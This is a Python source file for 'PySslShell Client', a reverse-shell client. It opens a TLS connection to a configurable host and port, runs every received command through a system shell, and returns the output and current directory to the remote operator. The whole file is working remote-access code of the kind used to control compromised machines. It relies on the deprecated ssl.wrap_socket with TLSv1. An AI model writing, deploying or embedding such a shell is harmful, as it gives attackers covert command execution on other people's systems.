"""
PySslShell Client - Python2/3 Compatible
Author: Darkerego <https://github.com/darkerego>
"""

import os
import socket
import subprocess
import ssl
from sys import exit

# Create a socket
def socket_create():
    try:
        global host
        global port
        global ssls
        host = '127.0.0.1'
        port = 9999
        s = socket.socket()
        ssls = wrappedSocket = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        ssls.connect((host, port))
    except socket.error as msg:
        print("Socket connection error: " + str(msg))


# Receive commands from remote server and run on local machine
def receive_commands():
    global s
    while True:
        try:
            data = ssls.recv(1024)
            if data[:].decode("utf-8") == 'quit':
                ssls.close()
                exit(0)
            if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8"))
            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = output_bytes.decode('utf-8')
                try:
                    ssls.send(str.encode(output_str + str(os.getcwd()) + '> '))
                except TypeError:
                    output_str = str(output_bytes)  # For Python2 compatibility
                    ssls.send(str.encode(output_str + str(os.getcwd()) + '> '))
        except KeyboardInterrupt:
            ssls.close()
            exit(0)


def main():
    socket_create()
    socket_connect()
    receive_commands()


main()
